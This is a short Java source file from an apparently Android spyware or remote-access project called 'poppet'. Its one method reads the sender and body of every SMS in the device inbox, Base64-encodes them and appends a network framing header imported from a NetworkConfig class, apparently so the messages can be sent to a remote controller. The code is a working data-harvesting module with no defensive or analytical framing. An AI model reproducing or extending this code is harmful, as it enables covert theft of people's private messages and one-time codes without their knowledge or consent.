package com.poppet.modules.messages;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Base64;

import static com.poppet.config.NetworkConfig.END_HEADER;

public class getMessages {

    public static String getAllMessages(Context mContext) {
        StringBuilder allMessages = new StringBuilder();
        Uri messageUri = Uri.parse("content://sms/inbox/");
        Cursor messagesCursor = mContext.getContentResolver().query(messageUri, null, null, null, null);
        while ( messagesCursor != null && messagesCursor.moveToNext()) {
            String number = messagesCursor.getString(messagesCursor.getColumnIndex(Telephony.Sms.ADDRESS));
            String body = messagesCursor.getString(messagesCursor.getColumnIndex(Telephony.Sms.BODY));
            allMessages.append(number).append(" : ").append(body).append("\n");
        }
        if (messagesCursor != null) {
            messagesCursor.close();
        }
        String base64Data = Base64.encodeToString(allMessages.toString().getBytes(), Base64.DEFAULT);
        base64Data += "\n" + END_HEADER;
        return base64Data;
    }

}
